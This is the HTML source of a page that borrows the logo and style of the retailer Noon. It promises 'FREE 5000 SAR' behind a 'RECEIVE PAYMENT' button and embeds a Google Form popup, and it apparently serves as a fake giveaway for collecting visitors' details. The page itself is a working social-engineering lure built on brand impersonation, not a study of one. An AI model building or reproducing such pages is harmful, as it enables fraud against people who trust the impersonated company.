<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Noon-Style Gift Page</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>

<!-- Sticky Logo Section -->
<header class="sticky-header">
  <img src="images/Noon_Logo.webp" alt="Company Logo" class="logo" />
</header>

<main>
  <div class="container">
    <!-- iPhone 15 Pro Max Box -->
    <div class="box green-box">
      <img src="images/cash.png" alt="5000 SAR" />
      <h2>GET FREE 5000 SAR TO YOUR ACCOUNT</h2>
      <button class="btn receive-btn">RECEIVE PAYMENT</button>
    </div>
  </div>
</main>

<!-- Offers Slider (Sticky Footer) -->
<footer class="sticky-footer">
  <div class="offers-slider">
    <img src="images/1 offer.png" alt="Offer 1">
    <img src="images/2 offer.png" alt="Offer 2">
    <img src="images/offer 3.png" alt="Offer 3">
    <img src="images/4 offer.png" alt="Offer 4">
    <img src="images/5 offer.png" alt="Offer 5">
  </div>
</footer>

<!-- Google Form Popup -->
<div class="form-popup" id="giftForm">
  <button class="close-btn" title="Close">&times;</button>
  <iframe 
    src="https://docs.google.com/forms/d/e/1FAIpQLScVXfP8ZCcKdai6a_K7sal92FD6Pi1NBg3zukVE1SKRh6FfBQ/viewform?embedded=true" 
    width="100%" height="600" frameborder="0" marginheight="0" marginwidth="0">Loadingâ€¦</iframe>
</div>

<script src="script.js"></script>
</body>
</html>
